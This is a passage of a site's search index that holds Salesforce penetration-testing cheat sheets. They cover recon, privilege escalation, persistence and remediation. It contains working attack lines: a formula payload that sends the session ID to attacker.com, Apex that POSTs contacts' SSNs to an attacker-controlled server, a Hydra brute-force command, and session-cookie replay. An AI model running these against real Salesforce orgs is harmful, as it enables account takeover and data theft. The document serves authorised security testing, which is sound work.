<code>retURL</code>/<code>startURL</code> open redirect in auth flows</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#clickjackingcsrf","title":"Clickjacking/CSRF","text":"<ul> <li>Setup &gt; Session Settings: Confirm clickjack protection is ON</li> <li>Try embedding Salesforce pages in iframes</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#10-advanced-chainable-attack-vectors","title":"10. Advanced &amp; Chainable Attack Vectors","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#formula-injection","title":"Formula Injection","text":"<p>Payloads <pre><code>HYPERLINK(\"javascript:alert('Formula XSS')\", \"Click\")\nHYPERLINK(\"http://attacker.com/?sid=\"&amp;$Api.Session_ID, \"Export SID\")\n</code></pre> - Query all formula fields with potentially dangerous logic</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#platform-eventprocess-builderflow-exploitation","title":"Platform Event/Process Builder/Flow Exploitation","text":"<ul> <li>Low-priv user triggers system-context automation, e.g., process updates records they can't normally write</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#denial-of-service","title":"Denial of Service","text":"<ul> <li>Infinite Flows/recursive Apex/scheduled job loop</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#11-persistence-lateral-movement-post-exploitation","title":"11. Persistence, Lateral Movement &amp; Post-Exploitation","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#persistence","title":"Persistence","text":"<ul> <li>Create hidden admin or backdoor user via Apex (if possible)</li> <li>Implant malicious Flow or scheduled Apex job for recurring access</li> <li>Register own Connected App for persistent OAuth access</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#lateral-movement","title":"Lateral Movement","text":"<ul> <li>Assign oneself admin permissionSet via vulnerable Flows/Process automation</li> </ul> <p>SOQL <pre><code>INSERT PermissionSetAssignment (PermissionSetId, AssigneeId) VALUES ('0PSxxx', '005xxx')\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/","title":"Salesforce   3","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Phase 1: Reconnaissance &amp; Enumeration</li> <li>Phase 2: Identity &amp; Authentication Attacks</li> <li>Phase 3: Authorization &amp; Access Control Exploitation (The Core)</li> <li>Phase 4: Custom Code &amp; Business Logic Flaws</li> <li>Phase 5: Experience Cloud (Community) &amp; Guest User Exploitation</li> <li>Phase 6: Advanced Exploitation &amp; Data Exfiltration</li> <li>Essential Tooling &amp; Payloads</li> <li>Reporting &amp; Remediation Guidance</li> </ol>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#1-phase-1-reconnaissance-enumeration","title":"1. Phase 1: Reconnaissance &amp; Enumeration","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#11-unauthenticated-discovery","title":"1.1 Unauthenticated Discovery","text":"<ul> <li>Description: Identify public-facing Salesforce assets without credentials.</li> <li>Method:<ul> <li>Google/GitHub Dorking: <pre><code>site:*.my.salesforce.com \"Company Name\"\nsite:*.force.com \"Company Name\"\ninurl:\"/s/login\" site:company.com\n\"sfdx auth url\" \"client_secret\" site:github.com\n</code></pre></li> <li>Enumerate Subdomains: Use tools like <code>subfinder</code> or <code>amass</code> to find domains like <code>community.company.com</code> or <code>partners.company.com</code> that might be CNAMEs to a Salesforce Experience Cloud.</li> </ul> </li> <li>Impact: Maps the external attack surface, identifies login portals, and may reveal leaked credentials or code.</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#12-initial-org-user-context-post-auth","title":"1.2 Initial Org &amp; User Context (Post-Auth)","text":"<ul> <li>Description: Understand your environment and privilege level from the inside.</li> <li>Method:<ul> <li>UI Navigation: Go to <code>Setup</code> &gt; <code>Company Information</code>. Note the Organization Edition and Instance.</li> <li>SOQL Queries (Developer Console or Workbench): <pre><code>-- Get current user's profile and key permissions\nSELECT Id, Name, Profile.Name, (SELECT PermissionSet.Name, PermissionSet.IsOwnedByProfile FROM PermissionSetAssignments) FROM User WHERE Id = :UserInfo.getUserId()\n\n-- Check for \"God Mode\" permissions immediately\nSELECT Name FROM PermissionSet WHERE Id IN (SELECT PermissionSetId FROM PermissionSetAssignment WHERE AssigneeId = :UserInfo.getUserId()) AND (PermissionsModifyAllData = true OR PermissionsViewAllData = true OR PermissionsCustomizeApplication = true OR PermissionsAuthorApex = true)\n</code></pre></li> </ul> </li> <li>Impact: Establishes a baseline for testing. Knowing your permissions is the first step to escalating them.</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#2-phase-2-identity-authentication-attacks","title":"2. Phase 2: Identity &amp; Authentication Attacks","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#21-password-policy-weakness","title":"2.1 Password Policy Weakness","text":"<ul> <li>Description: Exploiting weak password policies to facilitate brute-force or spraying attacks.</li> <li>Method:<ul> <li>UI Navigation: <code>Setup</code> &gt; <code>Security</code> &gt; <code>Password Policies</code>.</li> <li>Check for:<ul> <li>Minimum Length &lt; 12 characters</li> <li>No Complexity Requirement</li> <li>Lockout Threshold &gt; 5 attempts</li> </ul> </li> </ul> </li> <li>Impact: Increased likelihood of account takeover through password guessing or credential stuffing.</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#22-mfa-bypass","title":"2.2 MFA Bypass","text":"<ul> <li>Description: Identifying users or scenarios where Multi-Factor Authentication is not enforced.</li> <li>Method:<ul> <li>SOQL Query: Find powerful users without MFA.     <pre><code>SELECT u.Username, u.Profile.Name FROM User u WHERE u.Profile.PermissionsModifyAllData = true AND NOT EXISTS (SELECT Id FROM TwoFactorInfo WHERE UserId = u.Id)\n</code></pre></li> <li>API Login Test: Attempt to log in via an API (e.g., using Postman or a Python script) with just a username and password. Weak configurations may not enforce MFA for API-only sessions.</li> </ul> </li> <li>Impact: Bypasses a critical security control, making high-privilege accounts vulnerable to simple credential compromise.</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#3-phase-3-authorization-access-control-exploitation-the-core","title":"3. Phase 3: Authorization &amp; Access Control Exploitation (The Core)","text":"<p>This is where the most critical Salesforce-specific vulnerabilities are found.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#31-vertical-privilege-escalation-abusing-god-mode-permissions","title":"3.1 Vertical Privilege Escalation (Abusing \"God Mode\" Permissions)","text":"<ul> <li>Description: Identifying users or profiles with excessive administrative permissions.</li> <li>Method (SOQL): Hunt for users assigned these permissions via their Profile or a Permission Set.     <pre><code>-- Find users who can bypass all data sharing\nSELECT Assignee.Name, Assignee.Profile.Name FROM PermissionSetAssignment WHERE (PermissionSet.PermissionsModifyAllData = true OR PermissionSet.PermissionsViewAllData = true) AND Assignee.IsActive = true\n\n-- Find users who can alter the system configuration or code\nSELECT Assignee.Name, Assignee.Profile.Name FROM PermissionSetAssignment WHERE (PermissionSet.PermissionsCustomizeApplication = true OR PermissionSet.PermissionsAuthorApex = true) AND Assignee.IsActive = true\n</code></pre></li> <li>Impact: A single non-admin user with these rights can lead to a full tenant compromise, data theft, or malicious modification of business logic.</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#32-horizontal-data-exposure-sharing-model-flaws","title":"3.2 Horizontal Data Exposure (Sharing Model Flaws)","text":"<ul> <li>Description: Gaining access to records (e.g., Accounts, Cases) that a user should not see based on their role.</li> <li>Method:<ul> <li>Check OWD: <code>Setup</code> &gt; <code>Security</code> &gt; <code>Sharing Settings</code>. Look for any object with Org-Wide Defaults of <code>Public Read/Write</code>. This is an immediate, critical-risk finding.</li> <li>Test for IDOR: As a low-privilege user, obtain the 15 or 18-digit Record ID of a record owned by another user. Attempt to access it directly via the URL: <code>https://&lt;instance&gt;.lightning.force.com/lightning/r/&lt;ObjectName&gt;/&lt;RECORD_ID&gt;/view</code>. An \"Insufficient Privileges\" error is the expected secure behavior.</li> </ul> </li> <li>Impact: Allows sales reps to see competitor pipelines, support agents to see sensitive HR cases, leading to data leakage and business integrity issues.</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#4-phase-4-custom-code-business-logic-flaws","title":"4. Phase 4: Custom Code &amp; Business Logic Flaws","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#41-soql-injection","title":"4.1 SOQL Injection","text":"<ul> <li>Description: Exploiting dynamically constructed SOQL queries to bypass security controls.</li> <li>Method:<ul> <li>Static Analysis (Code Review): Search Apex code for <code>Database.query()</code> using string concatenation.     <pre><code>// VULNERABLE:\nString query = 'SELECT Id, Name FROM Contact WHERE LastName = \\'' + userInput + '\\'';\nList&lt;Contact&gt; contacts = Database.query(query);\n\n// SECURE (Uses Bind Variable):\nList&lt;Contact&gt; contacts = [SELECT Id FROM Contact WHERE LastName = :userInput];\n</code></pre></li> <li>Dynamic Analysis: In a search field, inject a single quote (<code>'</code>) or SOQL logic (<code>' OR Name != '</code>). A database error or an unexpectedly large result set indicates a vulnerability.</li> </ul> </li> <li>Impact: Full data extraction from any object, denial of service, or authentication bypass.</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#42-insecure-apex-execution-context-without-sharing","title":"4.2 Insecure Apex Execution Context (<code>without sharing</code>)","text":"<ul> <li>Description: This is the most common and critical Salesforce code vulnerability. An Apex class running <code>without sharing</code> intentionally ignores all of the user's record-level sharing permissions, running in a \"god mode\" for data access.</li> <li>Method:<ul> <li>Static Analysis: Search the codebase for Apex classes declared as <code>public without sharing class</code> or with no sharing keyword specified in an <code>@AuraEnabled</code> context (which defaults to <code>without sharing</code>).</li> <li>Dynamic Analysis (Burp Suite): As a low-privilege user, perform an action via a custom component (e.g., save a record). If the action succeeds even though you lack the underlying permissions, the backing Apex code is running <code>without sharing</code>.</li> </ul> </li> <li>Impact: Critical privilege escalation. Allows a low-privilege user to read, create, or modify any record accessible to the system, completely bypassing the security model.</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#43-cross-site-scripting-xss-in-visualforcelwc","title":"4.3 Cross-Site Scripting (XSS) in Visualforce/LWC","text":"<ul> <li>Description: Injecting malicious client-side scripts into custom UI components.</li> <li>Method:<ul> <li>Visualforce: Look for <code>&lt;apex:outputText value=\"{!...}\" escape=\"false\" /&gt;</code>.</li> <li>Lightning (LWC/Aura): Look for direct DOM manipulation (<code>element.innerHTML = ...</code>) or use of <code>lwc:dom=\"manual\"</code>.</li> </ul> </li> <li>Impact: Session hijacking, credential theft, performing actions on behalf of the victim.</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#5-phase-5-experience-cloud-community-guest-user-exploitation","title":"5. Phase 5: Experience Cloud (Community) &amp; Guest User Exploitation","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#51-over-privileged-guest-user","title":"5.1 Over-Privileged Guest User","text":"<ul> <li>Description: The unauthenticated \"Guest User\" has excessive permissions, allowing public access to internal data. This is a top source of data breaches on the platform.</li> <li>Method:<ul> <li>UI Navigation: <code>Setup</code> &gt; <code>Digital Experiences</code> &gt; <code>All Sites</code>. For each a site, click <code>Workspaces</code> &gt; <code>Administration</code> &gt; <code>Pages</code> &gt; <code>Go to Force.com</code> and click Public Access Settings.</li> <li>Check Permissions: In the Guest User's Profile, review \"Object Settings\". This profile should have NO access to standard objects like Account, Contact, or User by default. Any <code>Read</code> or <code>View</code> access is a potential high-risk finding.</li> </ul> </li> <li>Impact: Anonymous, unauthenticated data exfiltration of customer lists, user details, and sensitive business data.</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#52-guest-user-sharing-rule-bypass","title":"5.2 Guest User Sharing Rule Bypass","text":"<ul> <li>Description: Even with a locked-down profile, guest users can see records if a misconfigured Sharing Rule grants access to records owned by the guest.</li> <li>Method:<ul> <li>UI Navigation: In <code>Setup</code> &gt; <code>Security</code> &gt; <code>Sharing Settings</code>, enable the setting <code>Secure guest user record access</code>. If this is disabled, it is a critical finding.</li> <li>Test for IDORs: As an unauthenticated guest user browsing the community, attempt to access internal record IDs.</li> </ul> </li> <li>Impact: Allows unauthenticated users to view specific records that have been unintentionally shared with the public.</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#6-phase-6-advanced-exploitation-data-exfiltration","title":"6. Phase 6: Advanced Exploitation &amp; Data Exfiltration","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#61-full-org-takeover-via-author-apex","title":"6.1 Full Org Takeover via <code>Author Apex</code>","text":"<ul> <li>Description: A user with the <code>Author Apex</code> permission can execute arbitrary code and grant themselves System Administrator rights.</li> <li>Method (<code>Execute Anonymous</code> in Developer Console): <pre><code>// Find the System Administrator profile\nProfile p = [SELECT Id FROM Profile WHERE Name='System Administrator'];\n\n// Get the current user\nUser u = [SELECT Id FROM User WHERE Id = :UserInfo.getUserId()];\n\n// Assign the System Administrator profile to self\nu.ProfileId = p.Id;\nupdate u;\n</code></pre></li> <li>Impact: Complete, persistent compromise of the Salesforce tenant.</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#62-covert-data-exfiltration-via-callouts","title":"6.2 Covert Data Exfiltration via Callouts","text":"<ul> <li>Description: Using Apex code to send sensitive data to an external, attacker-controlled server.</li> <li>Method (<code>Execute Anonymous</code> or in a Trigger): <pre><code>// Query sensitive data\nList&lt;Contact&gt; sensitiveContacts = [SELECT Name, Email, SSN__c FROM Contact LIMIT 10];\n\n// Prepare the exfiltration request\nHttpRequest req = new HttpRequest();\nreq.setEndpoint('https://attacker-controlled-server.com/log'); // Your Burp Collaborator or server\nreq.setMethod('POST');\nreq.setHeader('Content-Type', 'application/json');\nreq.setBody(JSON.serialize(sensitiveContacts));\n\n// Send the data\nnew Http().send(req);\n</code></pre></li> <li>Impact: Covert, large-scale data theft that bypasses standard Salesforce event monitoring.</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#7-essential-tooling-payloads","title":"7. Essential Tooling &amp; Payloads","text":"<ul> <li>Browser Extensions:<ul> <li>Salesforce Inspector: Absolutely essential for on-the-fly data and metadata inspection.</li> <li>Salesforce Advanced Code Searcher: Quickly search an org's codebase.</li> </ul> </li> <li>Web &amp; API Testing:<ul> <li>Burp Suite Professional: Mandatory for intercepting and manipulating <code>/aura</code>, <code>/apexremote</code>, and API traffic.</li> <li>Workbench: A powerful web-based tool for SOQL queries, REST API exploration, and metadata browsing.</li> </ul> </li> <li>CLI &amp; Static Analysis:<ul> <li>Salesforce CLI (SFDX): For retrieving metadata (code, profiles, etc.) for offline analysis.</li> <li>PMD Source Code Analyzer: Use with the Apex rule set to find security flaws in downloaded code.</li> </ul> </li> <li>Go-To SOQLi Payload: <code>' OR Name != '</code> (classic boolean-based test)</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/#8-reporting-remediation-guidance","title":"8. Reporting &amp; Remediation Guidance","text":"<ul> <li>Prioritize by Impact: Don't just report \"SOQL Injection.\" Report \"Authenticated Sales User Can Exfiltrate All Customer PII via SOQL Injection in Search Component.\"</li> <li>Provide Actionable Fixes:<ul> <li>For Code: Provide the exact line number and the secure coding alternative (e.g., \"Replace <code>Database.query()</code> with a static query using bind variables.\").</li> <li>For Permissions: Recommend creating granular Permission Sets following the Principle of Least Privilege. Advise against cloning the \"System Administrator\" profile.</li> <li>For Configuration: Provide the exact navigation path in <code>Setup</code> and the setting to change (e.g., \"In Sharing Settings, set the OWD for the <code>Case</code> object to <code>Private</code>.\").</li> </ul> </li> <li>Reference Official Docs: Link to Salesforce help articles or security guides to add credibility and assist the development team.</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/","title":"Salesforce   4","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Engagement Preparation &amp; Scoping</li> <li>Reconnaissance &amp; Environment Mapping</li> <li>Authentication &amp; Identity Testing</li> <li>Authorization &amp; Access Control Testing</li> <li>Data Exposure &amp; Exfiltration Testing</li> <li>Custom Code &amp; Business Logic Testing</li> <li>Platform Configuration &amp; Misconfiguration Testing</li> <li>API &amp; Integration Security Testing</li> <li>Client-Side &amp; Web Vulnerabilities Testing</li> <li>Advanced Exploitation &amp; Privilege Escalation</li> <li>Persistence &amp; Defense Evasion</li> <li>Reporting &amp; Remediation Framework</li> <li>Tools &amp; References</li> </ol>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#engagement-preparation-scoping","title":"Engagement Preparation &amp; Scoping","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#objective","title":"Objective","text":"<p>Define the scope, gather initial intelligence, and establish access for testing to ensure ethical boundaries and maximize test coverage.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#steps","title":"Steps","text":"<ul> <li>Confirm Salesforce Edition &amp; Clouds: Identify the edition (e.g., Enterprise, Unlimited) and clouds in use (e.g., Sales Cloud, Marketing Cloud) to understand feature sets and limitations.</li> <li>Request Test Accounts: Obtain multiple accounts with varying privilege levels (e.g., System Admin, Standard User, Guest User) to test permissions comprehensively.</li> <li>Identify Testing Constraints: Define limitations (e.g., no destructive testing, avoid production data) to align with RoE.</li> <li>Obtain API Access: Secure OAuth credentials or API tokens for automated testing and enumeration.</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#tools","title":"Tools","text":"<ul> <li>Salesforce CLI (<code>sfdx</code>)</li> <li><code>simple_salesforce</code> (Python library)</li> <li>Postman (API exploration)</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#impact","title":"Impact","text":"<p>Proper scoping ensures ethical testing and prevents legal or service disruptions while maximizing coverage of attack surfaces.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#reconnaissance-environment-mapping","title":"Reconnaissance &amp; Environment Mapping","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#21-org-metadata-enumeration","title":"2.1 Org Metadata Enumeration","text":"<p>Description: Gather critical metadata about the Salesforce org (Org ID, Instance, Edition) to identify potential attack vectors. Root Cause: Publicly accessible metadata or insufficient API restrictions may expose org details. Enumeration Techniques: - UI Navigation: Login as an admin or highest privilege account, navigate to <code>Setup &gt; Company Settings &gt; Company Information</code> to obtain Org ID, Instance (e.g., NA52), and Edition. - Salesforce CLI: Extract metadata for analysis.   <pre><code>sfdx force:auth:web:login -a targetOrg\nsfdx force:mdapi:retrieve -r ./metadata -u targetOrg\n</code></pre> - Apex Query (Developer Console): If accessible, run the following to query org details.   <pre><code>Organization org = [SELECT Id, Name, InstanceName, OrganizationType FROM Organization LIMIT 1];\nSystem.debug('Org Details: ' + org);\n</code></pre> Impact: Reveals edition-specific features (e.g., Unlimited Edition allows more custom code) and instance details for targeted attacks. Remediation: Restrict metadata access to admin roles only; monitor API calls for unusual metadata queries.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#22-user-role-enumeration","title":"2.2 User &amp; Role Enumeration","text":"<p>Description: Identify users, roles, and profiles to target high-privilege accounts for attacks. Root Cause: Lack of restrictions on user enumeration via UI or API. Enumeration Techniques: - UI Navigation: Navigate to <code>Setup &gt; Users &gt; Users</code> to list active users, noting profiles and roles. - SOQL Query (Developer Console): <pre><code>SELECT Id, Username, Email, FirstName, LastName, Profile.Name, UserRole.Name, IsActive \nFROM User \nWHERE IsActive = TRUE \nORDER BY Profile.Name \nLIMIT 200\n</code></pre> - REST API Enumeration (if API access available): <pre><code>curl -H \"Authorization: Bearer &lt;YOUR_ACCESS_TOKEN&gt;\" \\\n     \"https://&lt;INSTANCE&gt;.salesforce.com/services/data/v56.0/query?q=SELECT+Id,Username,Email+FROM+User+WHERE+IsActive=TRUE\" \\\n     -o users.json\n</code></pre> Impact: Enables social engineering, phishing, or brute-force attacks on admin accounts. Remediation: Restrict user list visibility to admins; enforce MFA; apply IP allowlisting for admin logins.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#23-custom-code-footprint-mapping","title":"2.3 Custom Code Footprint Mapping","text":"<p>Description: Identify custom-developed Apex, Visualforce, and Lightning Web Components (LWC) as primary attack surfaces. Root Cause: In-house or contractor-developed code often lacks secure coding practices, introducing logic flaws. Enumeration Techniques: - UI Navigation: Navigate to <code>Setup &gt; Custom Code</code> to list Apex Classes, Triggers, Visualforce Pages, and Lightning Components. Focus on components with no <code>NamespacePrefix</code> (indicates custom, not managed package). - SOQL Query (Developer Console): <pre><code>SELECT Name, ApiVersion, NamespacePrefix FROM ApexClass WHERE ApiVersion &lt; 45.0\n</code></pre>   (Older API versions have weaker security defaults.) - Static Analysis Tools: Use PMD or Checkmarx to grep for risky keywords like <code>Database.query(</code>, <code>without sharing</code>, or <code>escape=\"false\"</code>. Impact: Defines custom attack surfaces for vulnerabilities like SOQL injection or XSS. Remediation: Implement a secure SDLC; mandate SAST scanning in CI/CD pipelines; enforce API version upgrades.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#authentication-identity-testing","title":"Authentication &amp; Identity Testing","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#31-password-policy-bypass","title":"3.1 Password Policy Bypass","text":"<p>Description: Weak password policies (e.g., short length, no complexity) enable brute-force or credential stuffing attacks. Root Cause: Lack of strong password requirements or lockout mechanisms. Enumeration Techniques: - UI Navigation: Check <code>Setup &gt; Security &gt; Password Policies</code> for minimum length, complexity, history, and lockout settings. - SOQL Query (Developer Console): <pre><code>SELECT MinimumPasswordLength, PasswordComplexity, PasswordHistory, LockoutInterval FROM Organization\n</code></pre> - Exploitation Steps:   1. Enumerate policy parameters from UI or SOQL.   2. Use tools like Burp Suite Intruder or Hydra for brute-force attacks on <code>https://login.salesforce.com/</code>.      <pre><code>hydra -l &lt;targetuser&gt; -P wordlist.txt https://login.salesforce.com/ -s 443 http-post-form \"/?un=^USER^&amp;pw=^PASS^&amp;Login=Login:incorrect\"\n</code></pre> Impact: Account compromise via brute-force or stolen credentials. Remediation: Enforce 12+ character passwords with mixed case, numbers, and symbols; set lockout after 5 failed attempts; rotate passwords every 90 days.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#32-multi-factor-authentication-mfa-gaps","title":"3.2 Multi-Factor Authentication (MFA) Gaps","text":"<p>Description: Lack of MFA or inconsistent enforcement exposes high-privilege accounts to compromise. Root Cause: MFA not enforced for all users, especially admins or API users. Enumeration Techniques: - SOQL Query (Developer Console): <pre><code>SELECT Id, Username, UserPreferencesMfaRequired FROM User WHERE IsActive = TRUE\n</code></pre> - UI Navigation: Check <code>Setup &gt; Security &gt; Multi-Factor Authentication</code> for policies. - Exploitation Steps:   1. Identify users without <code>UserPreferencesMfaRequired = TRUE</code>.   2. Target these accounts for credential reuse or brute-force attacks using methods from 3.1. Impact: Account takeover without secondary authentication barriers. Remediation: Enforce MFA for all users, especially admins and integration accounts; use session security levels to require MFA for sensitive operations.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#33-session-management-exploits","title":"3.3 Session Management Exploits","text":"<p>Description: Weak session controls (e.g., long timeouts, no IP restrictions) enable session hijacking. Root Cause: Insufficient session security settings or lack of HttpOnly/Secure flags. Enumeration Techniques: - UI Navigation: Review <code>Setup &gt; Session Settings</code> for timeout, IP enforcement, and session locking policies. - Exploitation Steps:   1. Steal a session cookie (<code>sid</code>) from a victim\u2019s browser (via XSS or phishing).   2. Replay the session using a tool like cURL:      <pre><code>curl -H \"Cookie: sid=&lt;SESSIONID&gt;\" https://&lt;INSTANCE&gt;.my.salesforce.com/home/home.jsp\n</code></pre>   3. Test if the session remains valid from different IPs (indicating lack of IP pinning). Impact: Unauthorized access persistence via hijacked sessions. Remediation: Enforce IP restrictions on profiles; set aggressive session timeouts (e.g., 2 hours); enable session IP locking and HttpOnly/Secure attributes.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#authorization-access-control-testing","title":"Authorization &amp; Access Control Testing","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#41-over-privileged-profiles-permission-sets","title":"4.1 Over-Privileged Profiles &amp; Permission Sets","text":"<p>Description: Profiles or permission sets with excessive permissions (e.g., \u201cView All Data\u201d) allow unauthorized access. Root Cause: Admins grant broad permissions for convenience, violating least privilege principles. Enumeration Techniques: - UI Navigation: Check <code>Setup &gt; Users &gt; Profiles</code> for system permissions like \u201cView All Data\u201d or \u201cModify All Data\u201d. - SOQL Query (Developer Console): <pre><code>SELECT Id, Label, PermissionsViewAllData, PermissionsModifyAllData \nFROM PermissionSet \nWHERE PermissionsViewAllData = TRUE OR PermissionsModifyAllData = TRUE\n</code></pre> <pre><code>SELECT Assignee.Name, PermissionSet.Label \nFROM PermissionSetAssignment \nWHERE PermissionSet.PermissionsViewAllData = TRUE\n</code></pre> - Exploitation Steps:   1. Log in with a test account tied to an over-privileged profile.   2. Navigate to objects like <code>Account</code> or <code>Opportunity</code> and verify access to all records beyond user scope.   3. Attempt to modify or delete records to confirm \u201cModify All Data\u201d impact. Impact: Unauthorized access to or manipulation of org-wide data. Remediation: Adhere to least privilege; disable \u201cView All Data\u201d and \u201cModify All Data\u201d unless essential; audit permission sets regularly.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#42-sharing-rule-overexposure","title":"4.2 Sharing Rule Overexposure","text":"<p>Description: Overly permissive sharing rules expose data beyond intended users. Root Cause: Misconfigured manual sharing or Org-Wide Defaults (OWD) set to \u201cPublic Read/Write\u201d. Enumeration Techniques: - UI Navigation: Review <code>Setup &gt; Security &gt; Sharing Settings</code> for OWD and sharing rules per object. - Exploitation Steps:   1. Log in as a low-privilege user (e.g., Standard User).   2. Navigate to an object with suspected sharing rules (e.g., <code>Account</code> tab).   3. Attempt to view/edit records not owned by the user.   4. If API access is available, query records:      <pre><code>curl -H \"Authorization: Bearer &lt;YOUR_ACCESS_TOKEN&gt;\" \\\n     \"https://&lt;INSTANCE&gt;.salesforce.com/services/data/v56.0/query?q=SELECT+Id,Name+FROM+Account+LIMIT+100\" \\\n     -o accounts.json\n</code></pre> Impact: Data leakage or unauthorized modifications. Remediation: Set OWD to \u201cPrivate\u201d for sensitive objects; use role hierarchies and manual sharing sparingly; audit sharing rules.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#43-guest-user-community-exploitation","title":"4.3 Guest User &amp; Community Exploitation","text":"<p>Description: Guest users in Communities or Sites often have unintended 